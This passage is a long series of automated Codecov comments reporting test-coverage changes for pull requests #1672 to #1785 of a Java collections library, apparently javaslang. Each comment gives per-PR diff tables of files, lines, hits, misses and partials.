into master will not change coverage\n\ndiff\n@@             master      #1672   diff @@\n==========================================\n  Files            89         89          \n  Lines         11187      11187          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1881       1881          \n==========================================\n  Hits          10790      10790          \n  Misses          243        243          \n  Partials        154        154\n\nPowered by Codecov. Last update a73d49f...da54383\n. ## Current coverage is 96.58% (diff: 100%)\nMerging #1673 into master will not change coverage\n\ndiff\n@@             master      #1673   diff @@\n==========================================\n  Files            89         89          \n  Lines         11213      11213          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n  Hits          10830      10830          \n  Misses          239        239          \n  Partials        144        144\n\nPowered by Codecov. Last update 666840f...f463f29\n. ## Current coverage is 96.58% (diff: 100%)\nMerging #1674 into master will not change coverage\n\ndiff\n@@             master      #1674   diff @@\n==========================================\n  Files            89         89          \n  Lines         11213      11213          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n  Hits          10830      10830          \n  Misses          239        239          \n  Partials        144        144\n\nPowered by Codecov. Last update d1dcb26...6ddf1ed\n. ## Current coverage is 96.58% (diff: 100%)\nMerging #1675 into master will not change coverage\n\ndiff\n@@             master      #1675   diff @@\n==========================================\n  Files            89         89          \n  Lines         11213      11213          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n  Hits          10830      10830          \n  Misses          239        239          \n  Partials        144        144\n\nPowered by Codecov. Last update d72f418...351e43d\n. ## Current coverage is 97.09% (diff: 100%)\nMerging #1676 into master will increase coverage by 0.50%\n\ndiff\n@@             master      #1676   diff @@\n==========================================\n  Files            89         89          \n  Lines         11213      11213          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n+ Hits          10830      10887    +57   \n+ Misses          239        182    -57   \n  Partials        144        144\n\nPowered by Codecov. Last update 5b4f1b3...1d17c52\n. ## Current coverage is 97.09% (diff: 100%)\nMerging #1678 into master will not change coverage\n\ndiff\n@@             master      #1678   diff @@\n==========================================\n  Files            89         89          \n  Lines         11213      11213          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n  Hits          10887      10887          \n  Misses          182        182          \n  Partials        144        144\n\nPowered by Codecov. Last update 9955d59...49bc6df\n. ## Current coverage is 97.09% (diff: 85.71%)\nMerging #1679 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1679   diff @@\n==========================================\n  Files            89         89          \n  Lines         11213      11227    +14   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1883     +8   \n==========================================\n+ Hits          10887      10901    +14   \n+ Misses          182        181     -1   \n- Partials        144        145     +1\n\nPowered by Codecov. Last update 9955d59...a59cbdc\n. ## Current coverage is 97.10% (diff: 100%)\nMerging #1681 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1681   diff @@\n==========================================\n  Files            89         89          \n  Lines         11227      11242    +15   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1883       1886     +3   \n==========================================\n+ Hits          10901      10917    +16   \n  Misses          181        181          \n+ Partials        145        144     -1\n\nPowered by Codecov. Last update 222cd63...0aad4f6\n. ## Current coverage is 97.09% (diff: 100%)\nMerging #1682 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1682   diff @@\n==========================================\n  Files            89         89          \n  Lines         11227      11230     +3   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1883       1884     +1   \n==========================================\n+ Hits          10901      10904     +3   \n  Misses          181        181          \n  Partials        145        145\n\nPowered by Codecov. Last update 222cd63...584abe9\n. ## Current coverage is 97.01% (diff: 100%)\nMerging #1684 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1684   diff @@\n==========================================\n  Files            89         89          \n  Lines         11264      11243    -21   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1878       1877     -1   \n==========================================\n- Hits          10928      10907    -21   \n  Misses          196        196          \n  Partials        140        140\n\nPowered by Codecov. Last update 2625b10...c8c3ef5. ## Current coverage is 97.09% (diff: 100%)\nMerging #1686 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1686   diff @@\n==========================================\n  Files            89         89          \n  Lines         11227      11228     +1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1883       1883          \n==========================================\n+ Hits          10901      10902     +1   \n  Misses          181        181          \n  Partials        145        145\n\nPowered by Codecov. Last update 222cd63...9e6b5ed\n. ## Current coverage is 97.09% (diff: 100%)\nMerging #1687 into master will not change coverage\n\ndiff\n@@             master      #1687   diff @@\n==========================================\n  Files            89         89          \n  Lines         11227      11227          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1883       1883          \n==========================================\n  Hits          10901      10901          \n  Misses          181        181          \n  Partials        145        145\n\nPowered by Codecov. Last update 222cd63...2da7dd9\n. ## Current coverage is 97.12% (diff: 100%)\nMerging #1688 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1688   diff @@\n==========================================\n  Files            89         89          \n  Lines         11243      11243          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1886       1886          \n==========================================\n+ Hits          10918      10920     +2   \n+ Misses          181        180     -1   \n+ Partials        144        143     -1\n\nPowered by Codecov. Last update 541afa8...401ebeb\n. ## Current coverage is 97.10% (diff: 100%)\nMerging #1689 into master will not change coverage\n\ndiff\n@@             master      #1689   diff @@\n==========================================\n  Files            89         89          \n  Lines         11243      11243          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1886       1886          \n==========================================\n  Hits          10918      10918          \n  Misses          181        181          \n  Partials        144        144\n\nPowered by Codecov. Last update 541afa8...b97080b\n. ## Current coverage is 97.10% (diff: 100%)\nMerging #1690 into master will not change coverage\n\ndiff\n@@             master      #1690   diff @@\n==========================================\n  Files            89         89          \n  Lines         11243      11243          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1886       1886          \n==========================================\n  Hits          10918      10918          \n  Misses          181        181          \n  Partials        144        144\n\nPowered by Codecov. Last update 541afa8...a274a51\n. ## Current coverage is 97.06% (diff: 0.00%)\nMerging #1691 into master will decrease coverage by 0.04%\n\ndiff\n@@             master      #1691   diff @@\n==========================================\n  Files            89         89          \n  Lines         11243      11247     +4   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1886       1888     +2   \n==========================================\n- Hits          10918      10917     -1   \n- Misses          181        185     +4   \n- Partials        144        145     +1\n\nPowered by Codecov. Last update 541afa8...15667be\n. ## Current coverage is 97.06% (diff: 100%)\nMerging #1692 into master will not change coverage\n\ndiff\n@@             master      #1692   diff @@\n==========================================\n  Files            89         89          \n  Lines         11247      11247          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1888       1888          \n==========================================\n  Hits          10917      10917          \n- Misses          185        187     +2   \n+ Partials        145        143     -2\n\nPowered by Codecov. Last update 7db4c34...7c2c906\n. ## Current coverage is 97.06% (diff: 100%)\nMerging #1693 into master will not change coverage\n\ndiff\n@@             master      #1693   diff @@\n==========================================\n  Files            89         89          \n  Lines         11247      11247          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1888       1888          \n==========================================\n  Hits          10917      10917          \n  Misses          187        187          \n  Partials        143        143\n\nPowered by Codecov. Last update ac9e284...f14a66f\n. ## Current coverage is 97.04% (diff: 89.07%)\nMerging #1695 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1695   diff @@\n==========================================\n  Files            89         89          \n  Lines         11247      11277    +30   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1888       1888          \n==========================================\n+ Hits          10917      10944    +27   \n- Misses          187        193     +6   \n+ Partials        143        140     -3\n\nPowered by Codecov. Last update ee2f094...2767cf7\n. ## Current coverage is 97.01% (diff: 84.03%)\nMerging #1696 into master will decrease coverage by 0.03%\n\ndiff\n@@             master      #1696   diff @@\n==========================================\n  Files            89         89          \n  Lines         11277      11264    -13   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1888       1878    -10   \n==========================================\n- Hits          10944      10928    -16   \n- Misses          193        196     +3   \n  Partials        140        140\n\nPowered by Codecov. Last update 618c4cd...7a9cc48. ## Current coverage is 96.86% (diff: 94.91%)\nMerging #1697 into master will decrease coverage by 0.17%\n\ndiff\n@@             master      #1697   diff @@\n==========================================\n  Files            89         93     +4   \n  Lines         11277      11115   -162   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1888       1870    -18   \n==========================================\n- Hits          10944      10767   -177   \n- Misses          193        207    +14   \n- Partials        140        141     +1\n\nPowered by Codecov. Last update e4459b1...0c6a343. ## Current coverage is 97.01% (diff: 100%)\nMerging #1698 into master will not change coverage\n\ndiff\n@@             master      #1698   diff @@\n==========================================\n  Files            89         89          \n  Lines         11264      11264          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1878       1878          \n==========================================\n  Hits          10928      10928          \n  Misses          196        196          \n  Partials        140        140\n\nPowered by Codecov. Last update 5e3aeef...61abc7c. ## Current coverage is 97.03% (diff: 100%)\nMerging #1700 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1700   diff @@\n==========================================\n  Files            89         89          \n  Lines         11264      11268     +4   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1878       1876     -2   \n==========================================\n+ Hits          10928      10934     +6   \n+ Misses          196        195     -1   \n+ Partials        140        139     -1\n\nPowered by Codecov. Last update 2625b10...708434e. ## Current coverage is 97.01% (diff: 100%)\nMerging #1702 into master will not change coverage\n\ndiff\n@@             master      #1702   diff @@\n==========================================\n  Files            89         89          \n  Lines         11264      11264          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1878       1878          \n==========================================\n  Hits          10928      10928          \n  Misses          196        196          \n  Partials        140        140\n\nPowered by Codecov. Last update 2625b10...dde3b94. ## Current coverage is 97.00% (diff: 95.23%)\nMerging #1703 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1703   diff @@\n==========================================\n  Files            89         89          \n  Lines         11247      11214    -33   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n- Hits          10911      10878    -33   \n  Misses          196        196          \n  Partials        140        140\n\nPowered by Codecov. Last update 765071b...ce39e0b. ## Current coverage is 96.98% (diff: 86.66%)\nMerging #1706 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1706   diff @@\n==========================================\n  Files            89         89          \n  Lines         11214      11229    +15   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n+ Hits          10878      10891    +13   \n- Misses          196        198     +2   \n  Partials        140        140\n\nPowered by Codecov. Last update 68c71aa...75c41c1. ## Current coverage is 96.98% (diff: 100%)\nMerging #1708 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1708   diff @@\n==========================================\n  Files            89         87     -2   \n  Lines         11229      11156    -73   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n- Hits          10891      10820    -71   \n+ Misses          198        197     -1   \n+ Partials        140        139     -1\n\nPowered by Codecov. Last update f4ed1fc...5cda1a7. ## Current coverage is 96.91% (diff: 61.53%)\nMerging #1711 into master will decrease coverage by 0.05%\n\ndiff\n@@             master      #1711   diff @@\n==========================================\n  Files            87         87          \n  Lines         11156      11191    +35   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1880     +5   \n==========================================\n+ Hits          10818      10846    +28   \n- Misses          198        203     +5   \n- Partials        140        142     +2\n\nPowered by Codecov. Last update b72230a...d843319. ## Current coverage is 96.96% (diff: 90.90%)\nMerging #1712 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1712   diff @@\n==========================================\n  Files            87         87          \n  Lines         11156      11167    +11   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1876     +1   \n==========================================\n+ Hits          10818      10828    +10   \n- Misses          198        199     +1   \n  Partials        140        140\n\nPowered by Codecov. Last update b72230a...f1a0ca9. ## Current coverage is 96.97% (diff: 100%)\nMerging #1713 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1713   diff @@\n==========================================\n  Files            87         87          \n  Lines         11156      11164     +8   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n+ Hits          10818      10826     +8   \n  Misses          198        198          \n  Partials        140        140\n\nPowered by Codecov. Last update b72230a...12775b8. ## Current coverage is 96.99% (diff: 97.56%)\nMerging #1714 into master will increase coverage by 0.02%\n\ndiff\n@@             master      #1714   diff @@\n==========================================\n  Files            87         88     +1   \n  Lines         11156      11197    +41   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n+ Hits          10818      10860    +42   \n  Misses          198        198          \n+ Partials        140        139     -1\n\nPowered by Codecov. Last update b72230a...bc9d718. ## Current coverage is 96.95% (diff: 98.42%)\nMerging #1715 into master will decrease coverage by 0.03%\n\ndiff\n@@             master      #1715   diff @@\n==========================================\n  Files            87         87          \n  Lines         11164      11181    +17   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1879     +4   \n==========================================\n+ Hits          10828      10841    +13   \n- Misses          197        198     +1   \n- Partials        139        142     +3\n\nPowered by Codecov. Last update 3c10a82...0cb69cf. ## Current coverage is 96.95% (diff: 100%)\nMerging #1717 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1717   diff @@\n==========================================\n  Files            87         87          \n  Lines         11181      11183     +2   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1879       1879          \n==========================================\n+ Hits          10841      10843     +2   \n  Misses          198        198          \n  Partials        142        142\n\nPowered by Codecov. Last update adab459...b698988. ## Current coverage is 96.91% (diff: 100%)\nMerging #1718 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1718   diff @@\n==========================================\n  Files            87         87          \n  Lines         11202      11207     +5   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1881       1881          \n==========================================\n+ Hits          10856      10861     +5   \n  Misses          204        204          \n  Partials        142        142\n\nPowered by Codecov. Last update f53ff8e...017fe99. ## Current coverage is 96.87% (diff: 100%)\nMerging #1719 into master will decrease coverage by 0.05%\n\ndiff\n@@             master      #1719   diff @@\n==========================================\n  Files            87         87          \n  Lines         11207      11195    -12   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1881       1881          \n==========================================\n- Hits          10863      10845    -18   \n- Misses          203        208     +5   \n- Partials        141        142     +1\n\nPowered by Codecov. Last update 1a43f76...61e8e00. ## Current coverage is 96.87% (diff: 90.00%)\nMerging #1720 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1720   diff @@\n==========================================\n  Files            87         87          \n  Lines         11195      11215    +20   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1881       1882     +1   \n==========================================\n+ Hits          10845      10865    +20   \n- Misses          208        209     +1   \n+ Partials        142        141     -1\n\nPowered by Codecov. Last update 5ac88e2...c77e4e5. ## Current coverage is 96.93% (diff: 100%)\nMerging #1721 into master will not change coverage\n\ndiff\n@@             master      #1721   diff @@\n==========================================\n  Files            87         87          \n  Lines         11207      11207          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1881       1881          \n==========================================\n  Hits          10863      10863          \n  Misses          203        203          \n  Partials        141        141\n\nPowered by Codecov. Last update 1a43f76...d9463fb. ## Current coverage is 96.86% (diff: 100%)\nMerging #1726 into master will decrease coverage by 0.04%\n\ndiff\n@@             master      #1726   diff @@\n==========================================\n  Files            87         87          \n  Lines         11207      11177    -30   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1881       1881          \n==========================================\n- Hits          10861      10827    -34   \n- Misses          204        208     +4   \n  Partials        142        142\n\nPowered by Codecov. Last update 4021698...cbb9911. ## Current coverage is 96.86% (diff: 100%)\nMerging #1730 into master will not change coverage\n\ndiff\n@@             master      #1730   diff @@\n==========================================\n  Files            87         87          \n  Lines         11215      11215          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1882       1882          \n==========================================\n  Hits          10863      10863          \n  Misses          210        210          \n  Partials        142        142\n\nPowered by Codecov. Last update 823c7f2...91f07a6. ## Current coverage is 96.86% (diff: 100%)\nMerging #1731 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1731   diff @@\n==========================================\n  Files            87         87          \n  Lines         11215      11215          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1882       1882          \n==========================================\n- Hits          10865      10863     -2   \n- Misses          209        210     +1   \n- Partials        141        142     +1\n\nPowered by Codecov. Last update 9908716...8881b57. ## Current coverage is 96.86% (diff: 100%)\nMerging #1732 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1732   diff @@\n==========================================\n  Files            87         87          \n  Lines         11215      11215          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1882       1882          \n==========================================\n- Hits          10865      10863     -2   \n- Misses          209        210     +1   \n- Partials        141        142     +1\n\nPowered by Codecov. Last update 9908716...9f5150f. ## Current coverage is 96.86% (diff: 100%)\nMerging #1733 into master will not change coverage\n\ndiff\n@@             master      #1733   diff @@\n==========================================\n  Files            87         87          \n  Lines         11215      11215          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1882       1882          \n==========================================\n  Hits          10863      10863          \n  Misses          210        210          \n  Partials        142        142\n\nPowered by Codecov. Last update 177a393...8824efd. ## Current coverage is 96.86% (diff: 100%)\nMerging #1734 into master will not change coverage\n\ndiff\n@@             master      #1734   diff @@\n==========================================\n  Files            87         87          \n  Lines         11215      11215          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1882       1882          \n==========================================\n  Hits          10863      10863          \n  Misses          210        210          \n  Partials        142        142\n\nPowered by Codecov. Last update 177a393...4ad1c38. ## Current coverage is 96.86% (diff: 100%)\nMerging #1735 into master will not change coverage\n\ndiff\n@@             master      #1735   diff @@\n==========================================\n  Files            87         87          \n  Lines         11215      11215          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1882       1882          \n==========================================\n  Hits          10863      10863          \n  Misses          210        210          \n  Partials        142        142\n\nPowered by Codecov. Last update b729bcb...056f273. ## Current coverage is 96.12% (diff: 28.18%)\nMerging #1736 into master will decrease coverage by 0.90%\n\ndiff\n@@             master      #1736   diff @@\n==========================================\n  Files            87         88     +1   \n  Lines         11191      11333   +142   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1874     +7   \n==========================================\n+ Hits          10859      10894    +35   \n- Misses          210        314   +104   \n- Partials        122        125     +3\n\nPowered by Codecov. Last update 28a7d4a...2f7fa9e. ## Current coverage is 97.00% (diff: 100%)\nMerging #1737 into master will increase coverage by 0.14%\n\ndiff\n@@             master      #1737   diff @@\n==========================================\n  Files            87         87          \n  Lines         11215      11193    -22   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1882       1867    -15   \n==========================================\n- Hits          10863      10858     -5   \n+ Misses          210        209     -1   \n+ Partials        142        126    -16\n\nPowered by Codecov. Last update 0f180a7...ce09cb0. ## Current coverage is 97.00% (diff: 100%)\nMerging #1740 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1740   diff @@\n==========================================\n  Files            87         87          \n  Lines         11193      11193          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1867          \n==========================================\n+ Hits          10856      10858     +2   \n+ Misses          210        209     -1   \n+ Partials        127        126     -1\n\nPowered by Codecov. Last update e05b5b0...274bd6a. ## Current coverage is 97.00% (diff: 80.23%)\nMerging #1742 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1742   diff @@\n==========================================\n  Files            87         87          \n  Lines         11193      11196     +3   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1867          \n==========================================\n+ Hits          10856      10861     +5   \n+ Misses          210        209     -1   \n+ Partials        127        126     -1\n\nPowered by Codecov. Last update abeb69c...54da002. ## Current coverage is 97.05% (diff: 91.22%)\nMerging #1743 into master will increase coverage by 0.04%\n\ndiff\n@@             master      #1743   diff @@\n==========================================\n  Files            87         87          \n  Lines         11196      11191     -5   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1867          \n==========================================\n  Hits          10861      10861          \n  Misses          209        209          \n+ Partials        126        121     -5\n\nPowered by Codecov. Last update 3c5f210...9a6b722. ## Current coverage is 97.05% (diff: 100%)\nMerging #1745 into master will not change coverage\n\ndiff\n@@             master      #1745   diff @@\n==========================================\n  Files            87         87          \n  Lines         11191      11191          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1867          \n==========================================\n  Hits          10861      10861          \n  Misses          209        209          \n  Partials        121        121\n\nPowered by Codecov. Last update 29c5029...5972998. ## Current coverage is 97.03% (diff: 100%)\nMerging #1746 into master will not change coverage\n\ndiff\n@@             master      #1746   diff @@\n==========================================\n  Files            87         87          \n  Lines         11191      11191          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1867          \n==========================================\n  Hits          10859      10859          \n  Misses          210        210          \n  Partials        122        122\n\nPowered by Codecov. Last update 45e70b2...a23004f. ## Current coverage is 97.03% (diff: 100%)\nMerging #1749 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1749   diff @@\n==========================================\n  Files            87         87          \n  Lines         11191      11190     -1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1860     -7   \n==========================================\n- Hits          10859      10858     -1   \n  Misses          210        210          \n  Partials        122        122\n\nPowered by Codecov. Last update d8f98bc...9aeded1. ## Current coverage is 95.99% (diff: 32.79%)\nMerging #1751 into master will decrease coverage by 1.03%\n\ndiff\n@@             master      #1751   diff @@\n==========================================\n  Files            87         88     +1   \n  Lines         11191      11370   +179   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1877    +10   \n==========================================\n+ Hits          10859      10915    +56   \n- Misses          210        334   +124   \n+ Partials        122        121     -1\n\nPowered by Codecov. Last update 28a7d4a...24f6552. # Codecov Report\nMerging #1752 into master will decrease coverage by 0.92%.\nThe diff coverage is 40.1%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1752      +/-\n============================================\n- Coverage     98.04%   97.12%   -0.93%   \n- Complexity     5116     5121       +5   \n============================================\n  Files            89       90       +1   \n  Lines         11585    11772     +187   \n  Branches       1523     1543      +20   \n============================================\n+ Hits          11359    11434      +75   \n- Misses          108      218     +110   \n- Partials        118      120       +2\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| .../src/main/java/javaslang/collection/LinearSeq.java | 100% <\u00f8> (\u00f8) | 16 <0> (\u00f8) | :arrow_down: |\n| ...src/main/java/javaslang/collection/IndexedSeq.java | 100% <\u00f8> (\u00f8) | 33 <0> (\u00f8) | :arrow_down: |\n| ...aslang/src/main/java/javaslang/collection/Seq.java | 95.08% <\u00f8> (\u00f8) | 51 <0> (\u00f8) | :arrow_down: |\n| ...ng/src/main/java/javaslang/collection/CharSeq.java | 99.07% <0%> (-0.75%) | 343 <0> (\u00f8) | |\n| ...ang/src/main/java/javaslang/collection/Stream.java | 97.82% <0%> (-0.78%) | 254 <0> (\u00f8) | |\n| ...lang/src/main/java/javaslang/collection/Array.java | 98.61% <0%> (-0.92%) | 241 <0> (\u00f8) | |\n| ...lang/src/main/java/javaslang/collection/Queue.java | 94.66% <0%> (-1.28%) | 194 <0> (\u00f8) | |\n| ...rc/main/java/javaslang/collection/Collections.java | 96.57% <0%> (-2.73%) | 76 <0> (\u00f8) | |\n| ...main/java/javaslang/collection/JavaConverters.java | 44.65% <44.65%> (\u00f8) | 1 <1> (?) | |\n| ...slang/src/main/java/javaslang/collection/List.java | 99.25% <50%> (-0.38%) | 260 <2> (+2) | |\n| ... and 2 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update cc8981b...79d36b0. Read the comment docs.\n. ## Current coverage is 97.05% (diff: 100%)\nMerging #1753 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1753   diff @@\n==========================================\n  Files            87         87          \n  Lines         11191      11191          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1867          \n==========================================\n+ Hits          10859      10861     +2   \n+ Misses          210        209     -1   \n+ Partials        122        121     -1\n\nPowered by Codecov. Last update 28a7d4a...d61debd. ## Current coverage is 97.02% (diff: 72.72%)\nMerging #1756 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1756   diff @@\n==========================================\n  Files            87         87          \n  Lines         11191      11202    +11   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1870     +3   \n==========================================\n+ Hits          10859      10869    +10   \n- Misses          210        211     +1   \n  Partials        122        122\n\nPowered by Codecov. Last update d8f98bc...07451e6. ## Current coverage is 97.03% (diff: 100%)\nMerging #1758 into master will not change coverage\n\ndiff\n@@             master      #1758   diff @@\n==========================================\n  Files            87         87          \n  Lines         11191      11191          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1867          \n==========================================\n  Hits          10859      10859          \n  Misses          210        210          \n  Partials        122        122\n\nPowered by Codecov. Last update d8f98bc...44c7830. ## Current coverage is 97.03% (diff: 100%)\nMerging #1759 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1759   diff @@\n==========================================\n  Files            87         87          \n  Lines         11191      11190     -1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1867          \n==========================================\n- Hits          10859      10858     -1   \n  Misses          210        210          \n  Partials        122        122\n\nPowered by Codecov. Last update d8f98bc...51a3054. ## Current coverage is 97.03% (diff: 100%)\nMerging #1761 into master will not change coverage\n\ndiff\n@@             master      #1761   diff @@\n==========================================\n  Files            87         87          \n  Lines         11191      11191          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1867          \n==========================================\n  Hits          10859      10859          \n  Misses          210        210          \n  Partials        122        122\n\nPowered by Codecov. Last update bcd2dbe...b874f2f. ## Current coverage is 97.00% (diff: 100%)\nMerging #1765 into master will not change coverage\n\ndiff\n@@             master      #1765   diff @@\n==========================================\n  Files            87         87          \n  Lines         11200      11200          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1863       1863          \n==========================================\n  Hits          10865      10865          \n  Misses          212        212          \n  Partials        123        123\n\nPowered by Codecov. Last update 631300c...a5b4c59. ## Current coverage is 97.00% (diff: 100%)\nMerging #1766 into master will not change coverage\n\ndiff\n@@             master      #1766   diff @@\n==========================================\n  Files            87         87          \n  Lines         11200      11200          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1863       1863          \n==========================================\n  Hits          10865      10865          \n  Misses          212        212          \n  Partials        123        123\n\nPowered by Codecov. Last update 008831c...1337c07. ## Current coverage is 97.09% (diff: 97.70%)\nMerging #1768 into master will increase coverage by 0.08%\n\ndiff\n@@             master      #1768   diff @@\n==========================================\n  Files            87         87          \n  Lines         11200      11195     -5   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1863       1862     -1   \n==========================================\n+ Hits          10865      10870     +5   \n+ Misses          212        203     -9   \n+ Partials        123        122     -1\n\nPowered by Codecov. Last update fd3bb08...85f1568. ## Current coverage is 97.09% (diff: 87.50%)\nMerging #1770 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1770   diff @@\n==========================================\n  Files            87         87          \n  Lines         11195      11203     +8   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1862       1864     +2   \n==========================================\n+ Hits          10870      10877     +7   \n- Misses          203        204     +1   \n  Partials        122        122\n\nPowered by Codecov. Last update 3367b40...9f1b34f. ## Current coverage is 97.09% (diff: 100%)\nMerging #1771 into master will not change coverage\n\ndiff\n@@             master      #1771   diff @@\n==========================================\n  Files            87         87          \n  Lines         11195      11195          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1862       1862          \n==========================================\n  Hits          10870      10870          \n  Misses          203        203          \n  Partials        122        122\n\nPowered by Codecov. Last update 3367b40...9854d89. ## Current coverage is 97.10% (diff: 100%)\nMerging #1777 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1777   diff @@\n==========================================\n  Files            87         87          \n  Lines         11195      11207    +12   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1862       1863     +1   \n==========================================\n+ Hits          10870      10882    +12   \n  Misses          203        203          \n  Partials        122        122\n\nPowered by Codecov. Last update 6b646a7...a2aea24. ## Current coverage is 97.10% (diff: 100%)\nMerging #1779 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1779   diff @@\n==========================================\n  Files            87         87          \n  Lines         11207      11208     +1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1863       1863          \n==========================================\n+ Hits          10882      10883     +1   \n  Misses          203        203          \n  Partials        122        122\n\nPowered by Codecov. Last update 6969d0d...cf163b2. ## Current coverage is 97.10% (diff: 100%)\nMerging #1782 into master will not change coverage\n\ndiff\n@@             master      #1782   diff @@\n==========================================\n  Files            87         87          \n  Lines         11208      11208          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1863       1863          \n==========================================\n  Hits          10883      10883          \n  Misses          203        203          \n  Partials        122        122\n\nPowered by Codecov. Last update c17c938...906c460. ## Current coverage is 97.10% (diff: 100%)\nMerging #1783 into master will not change coverage\n\ndiff\n@@             master      #1783   diff @@\n==========================================\n  Files            87         87          \n  Lines         11208      11208          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1863       1863          \n==========================================\n  Hits          10883      10883          \n  Misses          203        203          \n  Partials        122        122\n\nPowered by Codecov. Last update 62533d9...78b6cc2. ## Current coverage is 97.11% (diff: 100%)\nMerging #1784 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1784   diff @@\n==========================================\n  Files            87         87          \n  Lines         11208      11208          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1863       1863          \n==========================================\n+ Hits          10883      10885     +2   \n+ Misses          203        202     -1   \n+ Partials        122        121     -1\n\nPowered by Codecov. Last update 62533d9...9fc10e9. ## Current coverage is 97.11% (diff: 100%)\nMerging #1785 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1785   diff @@\n==========================================\n  Files            87         87          \n  Lines         11208      11208          \n  Methods           0          0         